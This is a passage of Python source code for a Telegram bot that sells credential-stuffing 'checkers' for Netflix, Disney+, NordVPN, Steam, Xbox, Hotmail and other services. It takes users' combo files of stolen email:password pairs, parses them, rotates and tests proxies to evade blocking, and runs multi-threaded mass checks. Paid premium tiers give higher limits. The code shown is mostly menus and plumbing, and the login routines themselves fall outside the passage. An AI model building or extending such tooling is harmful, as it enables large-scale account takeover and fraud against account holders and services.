    def encrypt(self, data: bytes, key: bytes, iv: bytes) -> bytes:
        padder = PKCS7(128).padder()
        padded = padder.update(data) + padder.finalize()
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
        encryptor = cipher.encryptor()
        return encryptor.update(padded) + encryptor.finalize()

class CryptoHelper:
    @staticmethod
    def get_byte_array(size: int) -> bytes:
        return os.urandom(size)

    @staticmethod
    def compute_signature(data: bytes, key: bytes) -> str:
        return base64.b64encode(hmac.new(key, data, hashlib.sha1).digest()).decode('ascii')

    @staticmethod
    def gzip_data(input_str: str) -> bytes:
        return gzip.compress(input_str.encode('ascii'), compresslevel=9)

    @staticmethod
    def envelope_encrypt(data: bytes, cert_base64: str) -> bytes:
        cert_der = base64.b64decode(cert_base64)
        cert = x509.Certificate.load(cert_der)
        aes_key = os.urandom(16)
        iv = os.urandom(16)
        aes_service = AesCryptographyService()
        encrypted_content = aes_service.encrypt(data, aes_key, iv)
        crypto_cert = crypto_x509.load_der_x509_certificate(cert_der)
        public_key = crypto_cert.public_key()
        encrypted_key = public_key.encrypt(aes_key, asym_padding.PKCS1v15())
        recipient_info = cms.RecipientInfo({
            'ktri': cms.KeyTransRecipientInfo({
                'version': cms.CMSVersion(0),
                'rid': cms.RecipientIdentifier({
                    'issuer_and_serial_number': cms.IssuerAndSerialNumber({
                        'issuer': cert['tbs_certificate']['issuer'],
                        'serial_number': cert['tbs_certificate']['serial_number']
                    })
                }),
                'key_encryption_algorithm': cms.KeyEncryptionAlgorithm({
                    'algorithm': '1.2.840.113549.1.1.1',
                    'parameters': core.Null()
                }),
                'encrypted_key': encrypted_key
            })
        })
        enveloped_data = cms.EnvelopedData({
            'version': cms.CMSVersion(0),
            'recipient_infos': cms.RecipientInfos([recipient_info]),
            'encrypted_content_info': cms.EncryptedContentInfo({
                'content_type': '1.2.840.113549.1.7.1',
                'content_encryption_algorithm': cms.EncryptionAlgorithm({
                    'algorithm': '2.16.840.1.101.3.4.1.2',
                    'parameters': iv
                }),
                'encrypted_content': encrypted_content
            })
        })
        content_info = cms.ContentInfo({
            'content_type': '1.2.840.113549.1.7.3',
            'content': enveloped_data
        })
        return content_info.dump()



# ==================== ADMIN PANEL ====================
def admin_panel(message):
    """Open admin control panel (message or call.message)."""
    try:
        chat_id = message.chat.id
    except Exception:
        chat_id = message
    uid = getattr(getattr(message, "from_user", None), "id", None) or chat_id
    if not is_admin(uid):
        try:
            bot.send_message(chat_id, f"{EMOJIS.get('error','🚫')} Access denied.")
        except Exception:
            pass
        return
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(ikb("Broadcast Message To All Users", callback_data="admin_broadcast", style="primary"))
    markup.add(ikb("View Bot Statistics", callback_data="admin_stats", style="primary"))
    markup.add(ikb("Generate Premium Redeem Codes", callback_data="admin_gen", style="success"))
    markup.add(ikb("Edit Welcome Text Message", callback_data="admin_set_txt", style="primary"))
    markup.add(ikb("Set Menu Media Files", callback_data="admin_set_media", style="primary"))
    markup.add(ikb("Add Force Join Channel", callback_data="admin_add_forcejoin", style="success"))
    markup.add(ikb("Add Custom Checker Module", callback_data="admin_add_checker", style="success"))
    markup.add(ikb("Remove Custom Checker Module", callback_data="admin_remove_checker", style="danger"))
    markup.add(ikb("Add Admin User By ID", callback_data="admin_add_admin", style="success"))
    markup.add(ikb("Remove Admin User By ID", callback_data="admin_remove_admin", style="danger"))
    text = (
        f"{EMOJIS.get('crown','👑')} <b>Admin Panel</b> {EMOJIS.get('crown','👑')}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"{EMOJIS.get('settings','⚙️')} Control broadcast, media, codes, force-join, checkers."
    )
    try:
        bot.send_message(chat_id, text, parse_mode="HTML", reply_markup=markup)
    except Exception:
        try:
            bot.send_message(chat_id, "Admin Panel", reply_markup=markup)
        except Exception:
            pass


@bot.message_handler(commands=["admin"])
def cmd_admin(message):
    uid = message.from_user.id
    if not is_admin(uid):
        bot.reply_to(message, f"{EMOJIS.get('error','🚫')} You are not admin.")
        return
    admin_panel(message)


@bot.callback_query_handler(func=lambda call: call.data in ("admin_add_admin", "admin_remove_admin"))
def admin_user_mgmt_start(call):
    if not is_admin(call.from_user.id):
        return
    try:
        bot.answer_callback_query(call.id)
    except Exception:
        pass
    is_add = call.data == "admin_add_admin"
    msg = bot.send_message(
        call.message.chat.id,
        f"{EMOJIS.get('crown','👑')} Send Telegram user ID to {'add' if is_add else 'remove'} as admin:",
    )
    bot.register_next_step_handler(msg, handle_admin_user_mgmt, is_add)



# ==================== TELEGRAM HANDLERS ====================
@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    create_user(user_id, message.from_user.username)
    unjoined_channels = check_all_force_joins(user_id)
    if unjoined_channels and not is_admin(user_id):
        markup = types.InlineKeyboardMarkup(row_width=1)
        for ch in unjoined_channels:
            markup.add(ikb(f"Join {ch.get('username', 'Channel')}", url=ch["link"], style="primary"))
        markup.add(ikb("I Have Joined All", callback_data="check_join_all", style="success"))
        fj_text = (
            f"{EMOJIS['diamond']} <b>Access Denied!</b> {EMOJIS['diamond']}\n\n"
            f"You must join our channels to use this bot.\n\n"
            f"1️⃣ Click the buttons below to join\n"
            f"2️⃣ After joining, click <b>I Have Joined All</b>"
        )
        try:
            send_media_with_caption(user_id, "force_join", fj_text, reply_markup=markup)
        except Exception:
            bot.send_message(user_id, fj_text, reply_markup=markup, parse_mode="HTML")
        return
    show_welcome_screen(user_id)

@bot.callback_query_handler(func=lambda call: call.data == "check_join_all")
def check_join_all_callback(call):
    user_id = call.from_user.id
    unjoined_channels = check_all_force_joins(user_id)
    if not unjoined_channels:
        try:
            bot.answer_callback_query(call.id, "✅ All channels joined!", show_alert=False)
        except Exception:
            pass
        # delete force-join message then open fresh welcome + short premium-emoji msg
        try:
            bot.delete_message(call.message.chat.id, call.message.message_id)
        except Exception:
            try:
                bot.edit_message_text(
                    f"{E('success')} <b>Joined!</b> {E('party')} Opening menu... {E('spark')}",
                    call.message.chat.id,
                    call.message.message_id,
                    parse_mode="HTML",
                )
            except Exception:
                pass
        try:
            bot.send_message(
                user_id,
                f"{E('success')}{E('party')} <b>All channels joined!</b> {E('fire')}{E('crown')}\n"
                f"{E('spark')} Welcome back — menu opening now {E('diamond')}",
                parse_mode="HTML",
            )
        except Exception:
            pass
        show_welcome_screen(user_id)
    else:
        try:
            bot.answer_callback_query(
                call.id,
                f"❌ You haven't joined all channels yet! {len(unjoined_channels)} remaining.",
                show_alert=True,
            )
        except Exception:
            pass

def show_welcome_screen(user_id):
    # 1 button per row = full-width (covers most of the screen width)
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(ikb("🔥 Open All Checkers", callback_data="menu_checkers", style="primary"))
    markup.add(ikb("✅ Check My Proxies Live / Dead", callback_data="check_my_proxies", style="success"))
    markup.add(ikb("💎 Redeem Premium Code", callback_data="menu_redeem", style="success"))
    markup.add(ikb("📊 My Account Stats", callback_data="menu_stats", style="primary"))
    settings = load_bot_settings()
    send_media_with_caption(user_id, "welcome", settings.get("welcome_text", WELCOME_TEXT), reply_markup=markup)

# ---------- CATEGORY CHECKERS MENU ----------
CHECKER_CATEGORIES = {
    "stream": {
        "title": "Stream",
        "style": "primary",
        "items": [
            ("Netflix", "check_netflix"),
            ("Disney+", "check_disney"),
            ("DAZN", "check_dazn"),
            ("Crunchyroll", "check_crunchyroll"),
            ("Paramount+", "check_paramount"),
            ("Peacock", "check_peacock"),
            ("Pluto TV", "check_pluto"),
            ("Plex", "check_plex"),
            ("NBA", "check_nba"),
            ("Tabii", "check_tabii"),
            ("Playabl", "check_playabl"),
            ("Deezer", "check_deezer"),
            ("Viki", "check_viki"),
        ],
    },
    "vpn": {
        "title": "VPN",
        "style": "success",
        "items": [
            ("NordVPN", "check_nordvpn"),
            ("ExpressVPN", "check_expressvpn"),
            ("Hotspot Shield", "check_hotspotshield"),
        ],
    },
    "tools": {
        "title": "Tools",
        "style": "primary",
        "items": [
            ("Hotmail", "check_hotmail"),
            ("Steam", "check_steam"),
            ("Xbox", "check_xbox"),
        ],
    },
    "other": {
        "title": "Other",
        "style": "danger",
        "items": [],  # multi + custom filled at runtime
    },
}


def _category_items(user_id, cat_key):
    cat = CHECKER_CATEGORIES.get(cat_key) or {}
    items = list(cat.get("items") or [])
    if cat_key == "other":
        if is_premium(user_id):
            items.append(("Multi-Checker", "check_multichecker"))
        else:
            items.append(("Multi-Checker Locked", "check_multichecker_premium_locked"))
        settings = load_bot_settings()
        for ch in settings.get("custom_checkers", []):
            items.append((ch["name"], f"check_custom_{ch['id']}"))
    return items


@bot.callback_query_handler(func=lambda call: call.data == "menu_checkers")
def handle_checkers_menu_first(call):
    try:
        bot.answer_callback_query(call.id)
    except Exception:
        pass
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.row(
        ikb("🎬 Stream", callback_data="cat_stream", style="primary", wide=False),
        ikb("🔒 VPN", callback_data="cat_vpn", style="success", wide=False),
    )
    markup.row(
        ikb("🛠 Tools", callback_data="cat_tools", style="primary", wide=False),
        ikb("✨ Other", callback_data="cat_other", style="danger", wide=False),
    )
    markup.row(ikb("Back", callback_data="back_main", style="danger", wide=False))
    text = (
        f"{EMOJIS['play']} <b>Select Category</b> {EMOJIS['play']}\n"
        f"Stream • VPN • Tools • Other — pick a group to open checkers."
    )
    try:
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode="HTML", reply_markup=markup)
    except Exception:
        try:
            bot.send_message(call.message.chat.id, text, parse_mode="HTML", reply_markup=markup)
        except Exception:
            pass


@bot.callback_query_handler(func=lambda call: call.data.startswith("cat_"))
def handle_category_menu(call):
    try:
        bot.answer_callback_query(call.id)
    except Exception:
        pass
    cat_key = call.data.replace("cat_", "", 1)
    if cat_key not in CHECKER_CATEGORIES:
        return
    user_id = call.from_user.id
    items = _category_items(user_id, cat_key)
    title = CHECKER_CATEGORIES[cat_key]["title"]
    style = CHECKER_CATEGORIES[cat_key].get("style") or "primary"
    markup = types.InlineKeyboardMarkup(row_width=3)
    row = []
    for label, cb in items:
        # short name, 3 per row — wider shared buttons
        row.append(ikb(label, callback_data=cb, style=style, wide=False))
        if len(row) == 3:
            markup.row(*row)
            row = []
    if row:
        markup.row(*row)
    markup.row(ikb("Back", callback_data="menu_checkers", style="danger", wide=False))
    text = (
        f"{EMOJIS['play']} <b>{title} Category</b> {EMOJIS['play']}\n"
        f"Select a checker below — mass or single after open.\n"
        f"Premium users get higher threads and multi-checker."
    )
    try:
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode="HTML", reply_markup=markup)
    except Exception:
        try:
            bot.send_message(call.message.chat.id, text, parse_mode="HTML", reply_markup=markup)
        except Exception:
            pass


@bot.callback_query_handler(func=lambda call: call.data == "check_my_proxies")
def handle_check_my_proxies(call):
    uid = call.from_user.id
    try:
        bot.answer_callback_query(call.id)
    except Exception:
        pass
    proxies = get_user_proxies(uid)
    if not proxies:
        kb = types.InlineKeyboardMarkup()
        kb.add(ikb("Back To Main Menu", callback_data="back_main", style="danger"))
        bot.send_message(
            uid,
            f"{EMOJIS['warn']} No saved proxies.\\nSend proxies during a mass check to store them, or use /proxies.",
            reply_markup=kb,
        )
        return
    bot.send_message(uid, f"{EMOJIS['time']} Testing {len(proxies)} saved proxies…")
    live, dead = test_proxies_live(proxies, max_workers=min(50, max(10, len(proxies))))
    # keep only live in permanent store optional - user asked check, report only; still update temp
    user_data = get_user(uid)
    user_data["temp_proxies"] = live
    save_users({str(uid): user_data})
    kb = types.InlineKeyboardMarkup()
    kb.add(ikb("Recheck All Proxies Again", callback_data="check_my_proxies", style="success"))
    kb.add(ikb("Back To Main Menu", callback_data="back_main", style="danger"))
    bot.send_message(
        uid,
        f"{EMOJIS['success']} Working: <b>{len(live)}</b>\\n"
        f"{EMOJIS['error']} Dead: <b>{len(dead)}</b>\\n"
        f"{EMOJIS['link']} Live proxies ready for next check.",
        parse_mode="HTML",
        reply_markup=kb,
    )


# ---------- HANDLE CHECKER SELECTION ----------
@bot.callback_query_handler(func=lambda call: call.data.startswith("check_"))
def checker_menu(call):
    user_id = call.from_user.id
    checker_id = call.data.replace("check_", "")
    
    if checker_id == "multichecker_premium_locked":
        bot.answer_callback_query(call.id, f"{EMOJIS['error']} This checker is only for Premium users. Use /redeem to upgrade! {EMOJIS['diamond']}", show_alert=True)
        return
    
    if checker_id == "multichecker" and not is_premium(user_id):
        bot.answer_callback_query(call.id, f"{EMOJIS['error']} Multi-Checker is a Premium feature. Use /redeem to upgrade! {EMOJIS['diamond']}", show_alert=True)
        return
    
    checker_map = {
        "dazn": ("DAZN", "dazn"),
        "deezer": ("Deezer", "deezer"),
        "disney": ("Disney+", "disney"),
        "hotspotshield": ("Hotspot Shield", "hotspotshield"),
        "nordvpn": ("NordVPN", "nordvpn"),
        "steam": ("Steam", "steam"),
        "expressvpn": ("ExpressVPN", "expressvpn"),
        "pluto": ("Pluto TV", "pluto"),
        "plex": ("Plex", "plex"),
        "peacock": ("Peacock", "peacock"),
        "tabii": ("Tabii", "tabii"),
        "playabl": ("Playabl", "playabl"),
        "crunchyroll": ("Crunchyroll", "crunchyroll"),
        "xbox": ("Xbox", "xbox"),
        "hotmail": ("Hotmail", "hotmail"),
        "nba": ("NBA", "hotmail"),
        "paramount": ("Paramount+", "hotmail"),
        "netflix": ("Netflix", "netflix"),
        "viki": ("Viki", "viki"),
        "multichecker": ("Multi-Checker", "multichecker"),
    }
    
    if checker_id in checker_map:
        checker_type, media_key = checker_map[checker_id]
    elif checker_id.startswith("custom_"):
        cid = checker_id.replace("custom_", "")
        settings = load_bot_settings()
        info = next((c for c in settings.get("custom_checkers", []) if c["id"] == cid), None)
        if not info:
            bot.answer_callback_query(call.id, f"{EMOJIS['error']} Checker not found! {EMOJIS['error']}", show_alert=True)
            return
        checker_type = info["name"]
        media_key = "checkers"
    else:
        return
    
    can_check_now, remaining = can_check(user_id)
    if not can_check_now:
        settings = load_bot_settings()
        cooldown_media = settings.get("media", {}).get("cooldown", {})
        if cooldown_media.get("type") == "sticker" and cooldown_media.get("file_id"):
            try:
                bot.send_sticker(user_id, cooldown_media["file_id"])
            except Exception:
                pass
        funny = (
            f"{E('laugh')}{E('skull')} "
            f"<b>LADLE SMART NHI BNNA</b> "
            f"{E('bang')}{E('fire')}\n\n"
            f"{E('time')} <b>10M WAIT KARLE PHIR KARNA</b> "
            f"{E('sleepy')}{E('cool')}\n\n"
            f"{E('diamond')} <b>YA PRIMIUM LELE</b> "
            f"{CONTACT_ADMIN} SE {E('crown')}{E('redeem')}\n\n"
            f"{E('warn')} Remaining ~{remaining} min {E('star')}"
        )
        try:
            bot.answer_callback_query(
                call.id,
                f"🤣💀 LADLE SMART NHI BNNA ‼️ 10M WAIT KARLE PHIR KARNA YA PRIMIUM LELE {CONTACT_ADMIN} SE 👑",
                show_alert=True,
            )
        except Exception:
            pass
        try:
            bot.send_message(user_id, funny, parse_mode="HTML")
        except Exception:
            try:
                bot.send_message(
                    user_id,
                    f"🤣💀 LADLE SMART NHI BNNA ‼️\n10M WAIT KARLE PHIR KARNA\nYA PRIMIUM LELE {CONTACT_ADMIN} SE 👑🎁\nRemaining ~{remaining} min",
                )
            except Exception:
                pass
        return
    
    safe_checker_type = checker_type.replace("<", "&lt;").replace(">", "&gt;")
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.row(
        ikb("📦 Mass Check • File", callback_data=f"mass_{checker_id}", style="primary", wide=False),
        ikb("🎯 Single Check • One", callback_data=f"single_{checker_id}", style="success", wide=False),
    )
    markup.add(ikb("🔙 Back", callback_data="menu_checkers", style="danger", wide=False))
    bot.delete_message(call.message.chat.id, call.message.message_id)
    send_media_with_caption(user_id, media_key, f"{EMOJIS['play']} <b>{safe_checker_type} Checker</b> {EMOJIS['play']}\n\nChoose your checking mode:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data in ["menu_redeem", "menu_stats"])
def handle_main_menu(call):
    user_id = call.from_user.id
    bot.delete_message(call.message.chat.id, call.message.message_id)
    if call.data == "menu_redeem":
        send_media_with_caption(user_id, "redeem", f"{EMOJIS['redeem']} <b>{EMOJIS['diamond']} Premium Redeem</b> {EMOJIS['diamond']} {EMOJIS['redeem']}\n\nSend your redeem code below to activate {EMOJIS['diamond']} Premium.\n\nType /cancel to cancel.")
        msg = bot.send_message(user_id, f"{EMOJIS['input']} Send your redeem code: {EMOJIS['input']}")
        bot.register_next_step_handler(msg, handle_redeem)
    elif call.data == "menu_stats":
        user = get_user(user_id)
        limits = get_user_limits(user_id)
        cooldown_text = "No" if not limits['has_cooldown'] else f"{limits['cooldown_minutes']} min"
        limit_text = 'Unlimited' if limits['line_limit'] is None else str(limits['line_limit'])
        status_display = f"{EMOJIS['diamond']} Premium" if is_premium(user_id) else "👤 Free"
        stats_text = (f"{EMOJIS['stats']} <b>Your Statistics</b> {EMOJIS['stats']}\n\n"
                      f"🔹 Status: {status_display}\n"
                      f"🔹 Total Checks: {user.get('total_checks', 0)}\n"
                      f"🔹 Max Threads: {limits['max_threads']}\n"
                      f"🔹 Line Limit: {limit_text}\n"
                      f"🔹 Cooldown: {cooldown_text}")
        markup = types.InlineKeyboardMarkup()
        markup.add(ikb("Back To Main Menu", callback_data="back_main", style="danger"))
        send_media_with_caption(user_id, "stats", stats_text, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "back_main")
def back_to_main(call):
    bot.delete_message(call.message.chat.id, call.message.message_id)
    show_welcome_screen(call.from_user.id)

# ----- Mass and Single check starts (with premium check for multichecker) -----
@bot.callback_query_handler(func=lambda call: call.data.startswith("mass_"))
def mass_check_start(call):
    checker_id = call.data.replace("mass_", "")
    user_id = call.from_user.id
    
    if checker_id == "multichecker" and not is_premium(user_id):
        bot.answer_callback_query(call.id, f"{EMOJIS['error']} Multi-Checker is a Premium feature. Use /redeem to upgrade! {EMOJIS['diamond']}", show_alert=True)
        return
    
    type_map = {
        "dazn": "DAZN",
        "deezer": "Deezer",
        "disney": "Disney+",
        "hotspotshield": "Hotspot Shield",
        "nordvpn": "NordVPN",
        "steam": "Steam",
        "expressvpn": "ExpressVPN",
        "crunchyroll": "Crunchyroll",
        "xbox": "Xbox",
        "pluto": "Pluto TV",
        "plex": "Plex",
        "peacock": "Peacock",
        "tabii": "Tabii",
        "playabl": "Playabl",
        "hotmail": "Hotmail",
        "nba": "NBA",
        "paramount": "Paramount+",
        "netflix": "Netflix",
        "viki": "Viki",
        "multichecker": "Multi-Checker"
    }
    if checker_id in type_map:
        checker_type = type_map[checker_id]
    else:
        settings = load_bot_settings()
        info = next((c for c in settings.get("custom_checkers", []) if c["id"] == checker_id), None)
        checker_type = info["name"] if info else "Custom"
    
    limits = get_user_limits(user_id)
    limit_text = 'Unlimited' if limits['line_limit'] is None else str(limits['line_limit'])
    bot.delete_message(call.message.chat.id, call.message.message_id)
    safe_checker_type = checker_type.replace("<", "&lt;").replace(">", "&gt;")
    msg = bot.send_message(user_id, f"{EMOJIS['file']} <b>{safe_checker_type} Mass Check</b> {EMOJIS['file']}\n\n{EMOJIS['stats']} Limits:\n• Max lines: {limit_text}\n• Max threads: {limits['max_threads']}\n\n📤 Send your combo file (any format, bot will auto-extract email:pass or username:pass)\n\nType /cancel to cancel", parse_mode='HTML')
    bot.register_next_step_handler(msg, handle_combo_file, checker_type=checker_type, checker_id=checker_id)


@bot.callback_query_handler(func=lambda call: call.data.startswith("single_"))
def single_check_start(call):
    checker_id = call.data.replace("single_", "")
    user_id = call.from_user.id

    if checker_id == "multichecker" and not is_premium(user_id):
        bot.answer_callback_query(call.id, f"{EMOJIS['error']} Multi-Checker is a Premium feature. Use /redeem to upgrade! {EMOJIS['diamond']}", show_alert=True)
        return

    type_map = {
        "dazn": "DAZN",
        "deezer": "Deezer",
        "disney": "Disney+",
        "hotspotshield": "Hotspot Shield",
        "nordvpn": "NordVPN",
        "steam": "Steam",
        "expressvpn": "ExpressVPN",
        "crunchyroll": "Crunchyroll",
        "xbox": "Xbox",
        "pluto": "Pluto TV",
        "plex": "Plex",
        "peacock": "Peacock",
        "tabii": "Tabii",
        "playabl": "Playabl",
        "hotmail": "Hotmail",
        "nba": "NBA",
        "paramount": "Paramount+",
        "netflix": "Netflix",
        "viki": "Viki",
        "multichecker": "Multi-Checker"
    }
    if checker_id in type_map:
        checker_type = type_map[checker_id]
    else:
        settings = load_bot_settings()
        info = next((c for c in settings.get("custom_checkers", []) if c["id"] == checker_id), None)
        checker_type = info["name"] if info else "Custom"

    can_check_now, remaining = can_check(user_id)
    if not can_check_now:
        bot.answer_callback_query(call.id, f"{EMOJIS['time']} Cooldown active. Wait {remaining} minutes.", show_alert=True)
        return

    try:
        bot.delete_message(call.message.chat.id, call.message.message_id)
    except Exception:
        pass
    safe_checker_type = checker_type.replace("<", "&lt;").replace(">", "&gt;")
    msg = bot.send_message(
        user_id,
        f"{EMOJIS['play']} <b>{safe_checker_type} Single Check</b>\n\n"
        f"Send combo as <code>email:password</code> or <code>user:password</code>\n\n"
        f"Type /cancel to cancel",
        parse_mode='HTML'
    )
    bot.register_next_step_handler(msg, handle_single_check, checker_type=checker_type, checker_id=checker_id)
    bot.answer_callback_query(call.id)


# ----- FIXED combo extraction -----
def handle_combo_file(message, checker_type, checker_id):
    user_id = message.from_user.id
    if message.text and message.text == "/cancel":
        bot.send_message(user_id, e_line("Cancelled", "error", "no", 1)); return
    if not message.document:
        msg = bot.send_message(user_id, f"{EMOJIS['error']} Please send a text file (.txt) {EMOJIS['error']}"); bot.register_next_step_handler(msg, handle_combo_file, checker_type=checker_type, checker_id=checker_id); return
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        filename = f"combos_{user_id}_{int(time.time())}.txt"
        with open(filename, 'wb') as f: f.write(downloaded_file)
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        
        # --- FIXED EXTRACTION: line-by-line, first colon only, strip, deduplicate ---
        combos = []
        for line in content.splitlines():
            line = line.strip()
            if not line:
                continue
            parts = line.split(':', 1)
            if len(parts) == 2:
                identifier, password = parts
                identifier = identifier.strip()
                password = password.strip()
                if identifier and password:
                    combos.append(f"{identifier}:{password}")
        # Remove duplicates while preserving order
        seen = set()
        unique_combos = []
        for combo in combos:
            if combo not in seen:
                seen.add(combo)
                unique_combos.append(combo)
        combos = unique_combos
        # -------------------------------------------------------------
        
        if not combos:
            bot.send_message(user_id, f"{EMOJIS['error']} No valid combos found in file (must be identifier:password) {EMOJIS['error']}")
            os.remove(filename)
            return
        
        limits = get_user_limits(user_id)
        if limits['line_limit'] and len(combos) > limits['line_limit']:
            bot.send_message(user_id, f"{EMOJIS['error']} File has {len(combos)} lines but your limit is {limits['line_limit']}\nContact {CONTACT_ADMIN} for {EMOJIS['diamond']} Premium! {EMOJIS['error']}")
            os.remove(filename)
            return
        
        user_data = get_user(user_id)
        user_data.update({'temp_combos': combos, 'temp_filename': filename, 'temp_checker_type': checker_type, 'temp_checker_id': checker_id})
        save_users({str(user_id): user_data})
        msg = bot.send_message(user_id, f"{EMOJIS['success']} Auto-extracted {len(combos)} valid combos! {EMOJIS['success']}\n\n{EMOJIS['link']} Send proxy file (ip:port or user:pass) OR type <b>skip</b> for no proxy.\nType /cancel to cancel. {EMOJIS['link']}", parse_mode='HTML')
        bot.register_next_step_handler(msg, handle_proxy_file)
    except Exception as e:
        bot.send_message(user_id, f"{EMOJIS['error']} Error: {str(e)} {EMOJIS['error']}")

def handle_proxy_file(message):
    user_id = message.from_user.id
    if message.text and message.text == "/cancel":
        bot.send_message(user_id, e_line("Cancelled", "error", "no", 1)); return
    proxies = []
    if message.text and message.text.strip().lower() in ("skip", "/skip", "no"):
        proxies = get_user_proxies(user_id)
        limits = get_user_limits(user_id)
        if proxies:
            bot.send_message(user_id, f"{EMOJIS['time']} Testing {len(proxies)} saved proxies… {EMOJIS['time']}")
            live, dead = test_proxies_live(proxies, max_workers=min(50, max(10, len(proxies))))
            user_data = get_user(user_id)
            user_data['temp_proxies'] = live
            save_users({str(user_id): user_data})
            kb = types.InlineKeyboardMarkup()
            kb.add(ikb("🚀 Start Check Now", callback_data="start_mass_check", style="success"))
            bot.send_message(
                user_id,
                f"{EMOJIS['success']} Working: <b>{len(live)}</b> {EMOJIS['success']}\n"
                f"{EMOJIS['error']} Dead: <b>{len(dead)}</b> {EMOJIS['error']}\n"
                f"{EMOJIS['tool']} Tap <b>Start Check</b> then threads (1-{limits['max_threads']})",
                parse_mode="HTML",
                reply_markup=kb,
            )
        else:
            user_data = get_user(user_id)
            user_data['temp_proxies'] = []
            save_users({str(user_id): user_data})
            kb = types.InlineKeyboardMarkup()
            kb.add(ikb("🚀 Start Check Now", callback_data="start_mass_check", style="success"))
            bot.send_message(
                user_id,
                f"{EMOJIS['warn']} No saved proxies — direct mode\nTap <b>Start Check</b> then threads (1-{limits['max_threads']})",
                parse_mode="HTML",
                reply_markup=kb,
            )
        return
    if message.document:
        try:
            file_info = bot.get_file(message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            filename = f"proxies_{user_id}_{int(time.time())}.txt"
            with open(filename, 'wb') as f: f.write(downloaded_file)
            with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                    if line.startswith('http'):
                        proxies.append(line)
                    else:
                        parts = line.split(':')
                        if len(parts) == 4:
                            proxies.append(f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}")
                        elif len(parts) == 2:
                            proxies.append(f"http://{parts[0]}:{parts[1]}")
                        else:
                            proxies.append(f"http://{line}")
            os.remove(filename)
        except Exception as e:
            bot.send_message(user_id, f"{EMOJIS['error']} Error reading proxies: {e} {EMOJIS['error']}")
            msg = bot.send_message(user_id, f"{EMOJIS['link']} Send proxy file again: {EMOJIS['link']}")
            bot.register_next_step_handler(msg, handle_proxy_file)
            return
    elif message.text:
        # allow paste of proxies in message
        for line in message.text.splitlines():
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            if line.startswith('http'):
                proxies.append(line)
            else:
                parts = line.split(':')
                if len(parts) == 4:
                    proxies.append(f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}")
                elif len(parts) == 2:
                    proxies.append(f"http://{parts[0]}:{parts[1]}")
                else:
                    proxies.append(f"http://{line}")
    if not proxies:
        bot.send_message(user_id, f"{EMOJIS['warn']} No proxies parsed — continuing without proxies. Type skip next time or send a valid list. {EMOJIS['warn']}")
        user_data = get_user(user_id)
        user_data['temp_proxies'] = []
        save_users({str(user_id): user_data})
        limits = get_user_limits(user_id)
        kb = types.InlineKeyboardMarkup()
        kb.add(ikb("🚀 Start Check Now", callback_data="start_mass_check", style="success"))
        bot.send_message(
            user_id,
            f"{EMOJIS['success']} Proxies: 0 live / 0 dead\n{EMOJIS['tool']} Threads next (1-{limits['max_threads']}) — tap Start Check {EMOJIS['tool']}",
            reply_markup=kb,
        )
        return
    bot.send_message(user_id, f"{EMOJIS['time']} Testing {len(proxies)} proxies… {EMOJIS['time']}")
    live, dead = test_proxies_live(proxies, max_workers=min(50, max(10, len(proxies))))
    if proxies:
        add_user_proxies(user_id, proxies)
    user_data = get_user(user_id)
    user_data['temp_proxies'] = live  # only live
    save_users({str(user_id): user_data})
    limits = get_user_limits(user_id)
    kb = types.InlineKeyboardMarkup()
    kb.add(ikb("🚀 Start Check Now", callback_data="start_mass_check", style="success"))
    bot.send_message(
        user_id,
        f"{EMOJIS['success']} Working: <b>{len(live)}</b> {EMOJIS['success']}\n"
        f"{EMOJIS['error']} Dead: <b>{len(dead)}</b> {EMOJIS['error']}\n"
        f"{EMOJIS['link']} Only live proxies will be used.\n"
        f"{EMOJIS['tool']} Tap <b>Start Check</b> then enter threads (1-{limits['max_threads']})",
        parse_mode="HTML",
        reply_markup=kb,
    )



@bot.callback_query_handler(func=lambda call: call.data == "start_mass_check")
def cb_start_mass_check(call):
    uid = call.from_user.id
    try:
        bot.answer_callback_query(call.id)
    except Exception:
        pass
    limits = get_user_limits(uid)
    msg = bot.send_message(
        uid,
        f"{EMOJIS['tool']} Enter threads (1-{limits['max_threads']}):",
    )
    bot.register_next_step_handler(msg, handle_thread_selection)

def handle_thread_selection(message):
    user_id = message.from_user.id
    try:
        threads = int(message.text)
        limits = get_user_limits(user_id)
        if threads < 1 or threads > limits['max_threads']:
            msg = bot.send_message(user_id, f"{EMOJIS['error']} Invalid. Enter 1-{limits['max_threads']}: {EMOJIS['error']}"); bot.register_next_step_handler(msg, handle_thread_selection); return
        user_data = get_user(user_id)
        combos = user_data.get('temp_combos', [])
        proxies = user_data.get('temp_proxies', [])
        filename = user_data.get('temp_filename')
        checker_type = user_data.get('temp_checker_type')
        checker_id = user_data.get('temp_checker_id')
        for key in ['temp_combos', 'temp_proxies', 'temp_filename', 'temp_checker_type', 'temp_checker_id']:
            user_data.pop(key, None)
        save_users({str(user_id): user_data})
        # concurrent limit: free 1, premium 3
        active = count_user_jobs(user_id)
        limit_c = max_concurrent_checks(user_id)
        if active >= limit_c:
            bot.send_message(
                user_id,
                f"{EMOJIS['warn']} Limit: {active}/{limit_c} checks running.\n"
                f"Wait for one to finish, or send /stop.",
            )
            return
        stop_kb = types.InlineKeyboardMarkup()
        stop_kb.add(ikb("⏹ Stop Check • ZIP", callback_data="stop_check", style="danger"))
        bot.send_message(
            user_id,
            f"{EMOJIS['success']} {checker_type} check started! {EMOJIS['success']}\n"
            f"{EMOJIS['stats']} Total: {len(combos)} {EMOJIS['stats']}\n"
            f"{EMOJIS['tool']} Threads: {threads} {EMOJIS['tool']}\n"
